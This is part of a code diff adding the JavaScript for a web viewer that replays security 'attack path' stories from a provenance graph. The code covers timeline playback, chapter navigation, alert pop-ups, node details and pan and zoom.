+  view = { k, x: r.width / 2 - (b.x + b.w / 2) * k, y: 50 + H / 2 - (b.y + b.h / 2) * k };
+  applyView(instant);
+}
+function boxOf(ids) {
+  let x0 = Infinity, y0 = Infinity, x1 = -Infinity, y1 = -Infinity;
+  ids.forEach((id) => { const p = S.pos[id]; if (!p) return; x0 = Math.min(x0, p.x); y0 = Math.min(y0, p.y); x1 = Math.max(x1, p.x + NODE_W); y1 = Math.max(y1, p.y + NODE_H); });
+  if (x0 === Infinity) return G.bounds;
+  return { x: x0 - 30, y: y0 - 50, w: x1 - x0 + 60, h: y1 - y0 + 90 };
+}
+function focus(instant) {
+  if (!follow || !S.events.length) return;
+  const ev = S.events[step], c = S.chapters[S.chapterOf(step)];
+  const ids = new Set([ev.src, ev.dst]);
+  const ci = S.chapters.indexOf(c);
+  (S.nodesByCh[ci] || []).forEach((id) => ids.add(id));
+  fitBox(boxOf([...ids]), 1.25, instant);
+}
+
+/* ---------- playing ---------- */
+function setStep(i, opts) {
+  opts = opts || {};
+  if (!S.events.length) return;
+  step = Math.max(0, Math.min(S.events.length - 1, i));
+  const ev = S.events[step];
+  for (const id in G.nodes) {
+    const shown = S.firstEv[id] <= step;
+    const g = G.nodes[id];
+    g.classList.toggle("show", shown);
+    g.classList.toggle("ghost", !shown && ghost);
+    g.classList.toggle("hot", id === ev.src || id === ev.dst);
+    g.setAttribute("tabindex", shown ? "0" : "-1");
+  }
+  for (const k in G.links) {
+    const L = S.links[k], p = G.links[k], shown = L.first <= step;
+    p.classList.toggle("show", shown);
+    p.classList.toggle("ghost", !shown && ghost);
+    const hot = k === ev.key;
+    if (hot !== p.classList.contains("hot")) p.classList.toggle("hot", hot);
+    if (hot) {
+      p.classList.remove("draw"); void p.getBoundingClientRect();
+      if (opts.animate) p.classList.add("draw");
+      p.setAttribute("marker-end", (OPCLASS[L.op] || "ctl") === "pair" ? "" : "url(#m-hot)");
+    } else if ((OPCLASS[L.op] || "ctl") !== "pair") {
+      p.classList.remove("draw");
+      p.setAttribute("marker-end", `url(#m-${OPCLASS[L.op] || "ctl"})`);
+    }
+    G.hits[k].classList.toggle("off", !shown);
+  }
+  // alerts: lit once told
+  S.alerts.forEach((a) => { if (G.nodes[a.node]) G.nodes[a.node].classList.toggle("alerted", a.at <= step); });
+  // the edge label
+  const lab = $("elabel"), P = G.links[ev.key];
+  try {
+    const len = P.getTotalLength(), m = P.getPointAtLength(len / 2);
+    lab.setAttribute("x", m.x); lab.setAttribute("y", m.y - 7); lab.setAttribute("text-anchor", "middle");
+    lab.textContent = ev.op + (ev.count > 1 ? " ×" + ev.count : "") + (ev.bytes ? "  " + fmtB(ev.bytes) : "");
+  } catch (e) { lab.textContent = ""; }
+  // caption
+  const ci = S.chapterOf(step), c = S.chapters[ci];
+  const t = ev.t !== null ? ev.t : ev.tShown;
+  $("caption").innerHTML = `<div class="when">${esc(fmtT(t) || " ")}${ev.why ? "  cause chain" : ""}</div>` +
+    `<div class="say">${sentence(ev)}</div>` +
+    `<div class="ctx">Chapter ${ci + 1}: ${c.code ? "<code>" + esc(c.title) + "</code>" : esc(c.title)}</div>`;
+  // toast
+  const now = S.alerts.filter((a) => a.at === step);
+  const toast = $("toast");
+  if (now.length) {
+    toast.innerHTML = now.map((a) => `<div class="r">${esc(a.rule)} ${esc(a.name)}  ${esc(fmtT(a.t))}</div>` +
+      `<div class="d">${esc(a.detail)}</div><div class="w">${esc(RULES[a.rule] || "")}</div>`).join("<hr style='border:0;border-top:1px solid var(--line);margin:8px 0'>");
+    toast.classList.add("on");
+  } else toast.classList.remove("on");
+  // rail, track, readout
+  document.querySelectorAll("#chapters li button").forEach((b, j) => {
+    if (j === ci) b.setAttribute("aria-current", "step"); else b.removeAttribute("aria-current");
+  });
+  document.querySelectorAll("#bands .band").forEach((b, j) => b.classList.toggle("cur", j === ci));
+  $("head").style.left = ((step + 0.5) / S.events.length * 100) + "%";
+  $("track").setAttribute("aria-valuenow", String(step + 1));
+  $("track").setAttribute("aria-valuetext", `step ${step + 1} of ${S.events.length}, ${fmtT(t)}`);
+  $("r-t").textContent = fmtT(t) || " ";
+  $("r-i").textContent = `step ${step + 1} of ${S.events.length}`;
+  if (!opts.keepCamera) focus(opts.instant);
+}
+function setFollow(on) { follow = on; $("b-follow").setAttribute("aria-pressed", String(on)); }
+function seek(i) { stop(); hideEnd(); if (auto) setFollow(true); setStep(i, { animate: true }); }
+function delay() {
+  const sp = parseFloat($("speed").value) || 1;
+  let d = 950;
+  const nx = S.events[step];
+  if (S.alerts.some((a) => a.at === step)) d += 1700;
+  if (step + 1 < S.events.length && S.chapters.some((c) => c.from === step + 1)) d += 700;
+  if (nx && nx.why) d += 250;
+  return d / sp;
+}
+function tick() {
+  if (step >= S.events.length - 1) { stop(); showEnd(); return; }
+  setStep(step + 1, { animate: true });
+  timer = setTimeout(tick, delay());
+}
+function play() {
+  if (!S.events.length) return;
+  hideEnd();
+  if (step >= S.events.length - 1) setStep(0, { animate: true });
+  playing = true; auto = true; setFollow(true);
+  $("b-play").textContent = "Pause";
+  timer = setTimeout(tick, delay());
+}
+function stop() { playing = false; clearTimeout(timer); $("b-play").textContent = "Play"; }
+function chapterJump(d) {
+  const ci = S.chapterOf(step), c = S.chapters[ci];
+  let target;
+  if (d < 0) target = step > c.from ? c.from : S.chapters[Math.max(0, ci - 1)].from;
+  else target = ci + 1 < S.chapters.length ? S.chapters[ci + 1].from : S.events.length - 1;
+  seek(target);
+}
+
+/* ---------- panels ---------- */
+function showNode(id) {
+  const n = S.byId[id], d = $("detail");
+  Object.values(G.nodes).forEach((g) => g.classList.remove("sel"));
+  G.nodes[id].classList.add("sel");
+  const evs = S.events.filter((e) => e.src === id || e.dst === id);
+  const al = S.alerts.filter((a) => a.node === id);
+  let h = `<button class="btn close" type="button" aria-label="Close">✕</button>`;
+  h += `<span class="kind k-${n.kind}">${n.kind === "file" && S.roles[id] && !S.roles[id].has("other") ? "program" : n.kind}</span>`;
+  h += `<h3>${esc(n.short.replace(/^(proc|file|sock) /, ""))}</h3>`;
+  if (n.cmd) h += `<pre>${esc(n.cmd)}</pre>`;
+  else if (n.label !== n.short) h += `<pre>${esc(n.label)}</pre>`;
+  if (id === S.doc.start) h += `<p class="src">The start of this story: the node the walks began from.</p>`;
+  al.forEach((a) => { h += `<div class="al"><b>${esc(a.rule)} ${esc(a.name)}</b> ${esc(fmtT(a.t))}<br>${esc(a.detail)}</div>`; });
+  h += `<h4>Its ${evs.length} edge${evs.length === 1 ? "" : "s"} in this story</h4><ul>`;
+  evs.forEach((e) => {
+    const out = e.src === id, other = out ? e.dst : e.src;
+    const tt = e.t !== null ? e.t : e.tShown;
+    h += `<li><button type="button" data-i="${e.i}"><span class="t">${esc(fmtT(tt))}</span>` +
+         `<span class="op">${out ? "" : "← "}${esc(e.op)}${out ? " →" : ""}</span>` +
+         `<span class="other">${esc(S.byId[other].short)}${e.count > 1 ? " ×" + e.count : ""}${e.bytes ? ", " + esc(fmtB(e.bytes)) : ""}</span></button></li>`;
+  });
+  h += "</ul>";
+  d.innerHTML = h;
+  d.hidden = false;
+  d.querySelector(".close").addEventListener("click", hideNode);
+  d.querySelectorAll("li button").forEach((b) => b.addEventListener("click", () => seek(parseInt(b.dataset.i, 10))));
+}
+function hideNode() { $("detail").hidden = true; Object.values(G.nodes || {}).forEach((g) => g.classList.remove("sel")); }
+function showEnd() {
+  const d = S.doc, on = S.alerts, off = d.alerts.filter((a) => !a.on_path), c = d.counts;
+  const rules = {};
+  on.forEach((a) => { rules[a.rule] = (rules[a.rule] || 0) + 1; });
+  let h = `<div class="card"><h2>What this run showed, and what the page leaves out</h2>`;
+  h += `<div class="big"><div class="a"><strong>${on.length}</strong><span>alerts on this path (${Object.keys(rules).sort().map((r) => r + " ×" + rules[r]).join(", ") || "none"})</span></div>`;
+  h += `<div><strong>${c.shown}</strong><span>nodes shown, of ${c.reached} the walks reached</span></div>`;
+  h += `<div><strong>${S.events.length}</strong><span>steps told, ${fmtT(S.t0)} to ${fmtT(S.t1)}</span></div></div>`;
+  h += `<p>Left out to keep the path readable:</p><ul>`;
+  h += `<li>${c.hidden_noise} file${c.hidden_noise === 1 ? "" : "s"} only read on the way (libraries, configuration);</li>`;
+  h += `<li>${c.hidden_old} earlier influences that the full backward walk finds off the cause chain.</li>`;
+  if (off.length) h += `<li>${off.length} alert${off.length === 1 ? "" : "s"} not on this path: ${off.map((a) => esc(a.rule + " " + a.name + ", " + a.detail)).join("; ")}.</li>`;
+  h += `</ul><p>The rules are patterns, not verdicts: R4 fires on every shell a network-facing process starts, so the story starts from the R4 alert whose own processes set off the most other alerts. The full walks are in <code>p15.graph.track</code>.</p>`;
+  h += `<div class="row"><button class="btn" type="button" id="e-close">Close</button><button class="btn" type="button" id="e-again" style="font-weight:600">Play again</button></div></div>`;
+  const e = $("endcard");
+  e.innerHTML = h; e.hidden = false;
+  $("e-close").addEventListener("click", hideEnd);
+  $("e-again").addEventListener("click", () => { hideEnd(); setStep(0, { animate: true }); play(); });
+  if (follow) fitBox(G.bounds, 1, false);
+}
+function hideEnd() { $("endcard").hidden = true; }
+
+/* ---------- the page around the graph ---------- */
+function chrome() {
+  const d = S.doc, st = S.byId[d.start];
+  $("title").textContent = d.title || "Attack path: " + st.short.replace(/^proc /, "process ");
+  document.title = d.title || "Attack path " + st.short.replace(/^proc /, "");
+  $("startcmd").innerHTML = st.cmd ? esc(st.cmd) : "";
+  const on = S.alerts.length;
+  $("stats").innerHTML = `<span><strong>${on}</strong> alert${on === 1 ? "" : "s"} on the path</span>` +
+    `<span><strong>${d.counts.shown}</strong> nodes shown of <strong>${d.counts.reached}</strong> reached</span>` +
+    `<span><strong>${S.events.length}</strong> steps in <strong>${S.chapters.length}</strong> chapters</span>` +
+    (d.ancestors.length ? `<span>started under <span class="mono">${esc(d.ancestors.slice(0, 4).join(" ← "))}${d.ancestors.length > 4 ? " ← …" : ""}</span></span>` : "");
+  // chapters
+  const ol = $("chapters");
+  ol.textContent = "";
+  S.chapters.forEach((c, i) => {
+    const li = el("li", {}, ol), b = el("button", { type: "button" }, li);
+    el("span", { class: "num", text: String(i + 1) }, b);
+    const ttl = el("span", { class: "ttl" }, b);
+    if (c.code) el("code", { text: c.title }, ttl); else ttl.textContent = c.title;
+    const evs = S.events.slice(c.from, c.to + 1).filter((e) => e.t !== null);
+    const span = evs.length ? (evs[0].t === evs[evs.length - 1].t ? fmtT(evs[0].t) : fmtT(evs[0].t) + " to " + fmtT(evs[evs.length - 1].t)) : "";
+    el("span", { class: "meta", text: (c.sub && !c.code ? c.sub + ". " : "") + `${c.to - c.from + 1} steps${span ? ", " + span : ""}` }, b);
+    const al = S.alerts.filter((a) => a.at >= c.from && a.at <= c.to);
+    if (al.length) {
+      const ch = el("span", { class: "chips" }, b);
+      al.forEach((a) => el("span", { class: "chip-r", text: a.rule + " " + a.name }, ch));
+    }
+    b.addEventListener("click", () => seek(c.from));
+  });
+  $("railfoot").innerHTML = `<button class="btn" type="button" id="b-end">What the page leaves out</button>`;
+  $("b-end").addEventListener("click", () => { stop(); showEnd(); });
+  // track
+  const N = S.events.length, bands = $("bands"), ticks = $("ticks"), flags = $("flags");
+  [bands, ticks, flags].forEach((x) => { x.textContent = ""; });
+  S.chapters.forEach((c, i) => {
+    el("div", { class: "band", style: `left:${c.from / N * 100}%;width:${(c.to - c.from + 1) / N * 100}%`, title: c.title, text: String(i + 1) }, bands);
+  });
+  S.events.forEach((e, i) => el("div", { class: `tick c-${OPCLASS[e.op] || "ctl"}`, style: `left:${(i + 0.5) / N * 100}%` }, ticks));
+  const byAt = {};
+  S.alerts.forEach((a) => { (byAt[a.at] = byAt[a.at] || []).push(a.rule); });
+  Object.keys(byAt).forEach((at) => el("div", { class: "flag", style: `left:${(+at + 0.5) / N * 100}%`, title: byAt[at].join(" "), text: byAt[at].join(" ") }, flags));
+  $("t-lo").textContent = fmtT(S.t0); $("t-hi").textContent = fmtT(S.t1);
+  $("track").setAttribute("aria-valuemax", String(N));
+  // source
+  const s = d.source || {};
+  let h = "";
+  if (s.kind === "text") {
+    h += `<p>Read back from the text report of <code>p15.graph.story</code>: <code>${esc(s.file || "?")}</code>` +
+         (s.sha256 ? `, SHA-256 <code>${esc(s.sha256)}</code>` : "") + `. Times have millisecond precision.</p>`;
+    if (s.rules) h += `<p>Alerts off the path from <code>${esc(s.rules.file)}</code>, SHA-256 <code>${esc(s.rules.sha256)}</code>.</p>`;
+  } else if (s.kind === "graph") {
+    h += `<p>Written by <code>p15.graph.story --json</code> from the run's graph${s.graph ? ` <code>${esc(s.graph)}</code>` : ""}.</p>`;
+  } else h += `<p>No source recorded in this story file.</p>`;
+  if (s.manifest) h += `<p>The run's manifest:</p><pre>${esc(s.manifest.join("\n"))}</pre>`;
+  h += `<p>Start node <code>${esc(st.label)}</code>. Format <code>${esc(d.schema)}</code>.</p>`;
+  $("srcbody").innerHTML = h;
+}
+
+function load(doc) {
+  stop(); hideNode(); hideEnd();
+  try { S = build(doc); }
+  catch (e) {
+    $("caption").innerHTML = `<div class="say err">${esc(e.message)}</div><div class="ctx">Open a story file written by p15.graph.story --json or p15.graph.viewer --json.</div>`;
+    return false;
+  }
+  draw(); chrome();
+  if (!S.events.length) {
+    $("caption").innerHTML = `<div class="say">This story has no edges to play.</div>`;
+    return true;
+  }
+  // at rest: the whole story told, the whole graph in view
+  auto = true; setFollow(false);
+  setStep(S.events.length - 1, { keepCamera: true });
+  requestAnimationFrame(() => fitBox(G.bounds, 1, true));
+  $("caption").innerHTML = `<div class="when">${S.events.length} steps</div><div class="say">The whole path is shown. Press <b>Play</b> or <span class="mono">→</span> to tell it from the start.</div>` +
+    `<div class="ctx">Click any box for its edges; click a chapter to jump to it.</div>`;
+  return true;
+}
+
+/* ---------- input ---------- */
+$("b-play").addEventListener("click", () => (playing ? stop() : play()));
+$("b-prev").addEventListener("click", () => seek(step - 1));
+$("b-next").addEventListener("click", () => seek(step + 1));
+$("b-prevch").addEventListener("click", () => chapterJump(-1));
+$("b-nextch").addEventListener("click", () => chapterJump(1));
+$("b-fit").addEventListener("click", () => { auto = false; setFollow(false); fitBox(G.bounds, 1, false); });
+$("b-follow").addEventListener("click", () => {
+  auto = !follow; setFollow(!follow); if (follow) focus(false);
+});
+$("b-ghost").addEventListener("click", () => {
+  ghost = !ghost; $("b-ghost").setAttribute("aria-pressed", String(ghost)); setStep(step, { keepCamera: true });
+});
+$("b-legend").addEventListener("click", () => $("legend").showModal());
+$("b-source").addEventListener("click", () => $("source").showModal());
+$("b-open").addEventListener("click", () => $("file").click());
+$("file").addEventListener("change", (e) => { if (e.target.files[0]) readFile(e.target.files[0]); e.target.value = ""; });
+function readFile(f) {
+  const r = new FileReader();
+  r.onload = () => {
+    let doc;
+    try { doc = JSON.parse(r.result); } catch (err) {
+      $("caption").innerHTML = `<div class="say err">${esc(f.name)} is not JSON: ${esc(err.message)}</div>`; return;
+    }
+    load(doc);
+  };
+  r.readAsText(f);
+}
+let dropEl = null;
+addEventListener("dragover", (e) => { e.preventDefault(); if (!dropEl) { dropEl = el("div", { class: "drop", text: "Drop a story file to open it" }, document.body); } });
+addEventListener("dragleave", (e) => { if (e.relatedTarget === null && dropEl) { dropEl.remove(); dropEl = null; } });
+addEventListener("drop", (e) => { e.preventDefault(); if (dropEl) { dropEl.remove(); dropEl = null; } if (e.dataTransfer.files[0]) readFile(e.dataTransfer.files[0]); });
+
+function setTheme(t) {
+  document.documentElement.setAttribute("data-theme", t);
+  try { localStorage.setItem("p15-viewer-theme", t); } catch (e) { /* storage refused: the choice lasts this visit */ }
+}
+try { const t = localStorage.getItem("p15-viewer-theme"); if (t === "light" || t === "dark") document.documentElement.setAttribute("data-theme", t); } catch (e) { /* no storage */ }
+$("b-theme").addEventListener("click", () => {
+  const cur = document.documentElement.getAttribute("data-theme") || (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+  setTheme(cur === "dark" ? "light" : "dark");
+});
+
+// the timeline: click or drag to seek
+const track = $("track");
+function trackAt(e) { const r = track.getBoundingClientRect(); return Math.floor((e.clientX - r.left) / r.width * S.events.length); }
+let scrubbing = false;
+track.addEventListener("pointerdown", (e) => { if (!S || !S.events.length) return; scrubbing = true; track.setPointerCapture(e.pointerId); seek(trackAt(e)); });
+track.addEventListener("pointermove", (e) => { if (scrubbing) { const i = trackAt(e); if (i !== step) { hideEnd(); setStep(i, { animate: false }); } } });
+track.addEventListener("pointerup", () => { scrubbing = false; });
+track.addEventListener("keydown", (e) => {
+  if (e.key === "ArrowLeft" || e.key === "ArrowDown") { e.preventDefault(); e.stopPropagation(); seek(step - 1); }
+  if (e.key === "ArrowRight" || e.key === "ArrowUp") { e.preventDefault(); e.stopPropagation(); seek(step + 1); }
+});
+
+// the stage: drag to pan, wheel to zoom
+const svg = $("svg");
+let drag = null;
+svg.addEventListener("pointerdown", (e) => {
+  if (e.target.closest(".node") || e.target.classList.contains("hit")) return;
+  drag = { x: e.clientX, y: e.clientY, vx: view.x, vy: view.y, moved: false };
+  svg.setPointerCapture(e.pointerId); svg.classList.add("dragging");
+});
+svg.addEventListener("pointermove", (e) => {
+  if (!drag) return;
+  const dx = e.clientX - drag.x, dy = e.clientY - drag.y;
+  if (Math.abs(dx) + Math.abs(dy) > 3) drag.moved = true;
+  if (drag.moved) {
+    auto = false; setFollow(false);
+    view.x = drag.vx + dx; view.y = drag.vy + dy; applyView(true);
+  }
+});
+svg.addEventListener("pointerup", () => { if (drag && !drag.moved) hideNode(); drag = null; svg.classList.remove("dragging"); });
+svg.addEventListener("wheel", (e) => {
+  e.preventDefault();
+  const r = svg.getBoundingClientRect(), mx = e.clientX - r.left, my = e.clientY - r.top;
+  const k = Math.max(0.15, Math.min(3, view.k * Math.exp(-e.deltaY * 0.0015)));
+  view.x = mx - (mx - view.x) * k / view.k; view.y = my - (my - view.y) * k / view.k; view.k = k;
+  auto = false; setFollow(false);
+  applyView(true);
+}, { passive: false });
+addEventListener("resize", () => { if (!S) return; if (follow) focus(true); else if (!$("endcard").hidden) fitBox(G.bounds, 1, true); });
+
+addEventListener("keydown", (e) => {
+  if (e.target.closest && e.target.closest("dialog, input, select")) return;
+  if (!S || !S.events.length) return;
+  const k = e.key;
+  if (k === " ") { e.preventDefault(); playing ? stop() : play(); }
+  else if (k === "ArrowRight") { e.preventDefault(); seek(step + 1); }
+  else if (k === "ArrowLeft") { e.preventDefault(); seek(step - 1); }
+  else if (k === "PageDown") { e.preventDefault(); chapterJump(1); }
+  else if (k === "PageUp") { e.preventDefault(); chapterJump(-1); }
+  else if (k === "Home") { e.preventDefault(); seek(0); }
+  else if (k === "End") { e.preventDefault(); seek(S.events.length - 1); }
+  else if (k === "o" || k === "O") $("b-fit").click();
+  else if (k === "f" || k === "F") $("b-follow").click();
+  else if (k === "g" || k === "G") $("b-ghost").click();
+  else if (k === "?") $("legend").showModal();
+  else if (k === "Escape") { hideNode(); hideEnd(); }
+});
+
+let doc = null;
+try { doc = JSON.parse($("story-data").textContent); }
+catch (e) { $("caption").innerHTML = `<div class="say">No story is embedded in this page. Open a story file, or drop one here.</div>`; }
+if (doc) load(doc);
+})();
+</script>
+</body>
+</html>
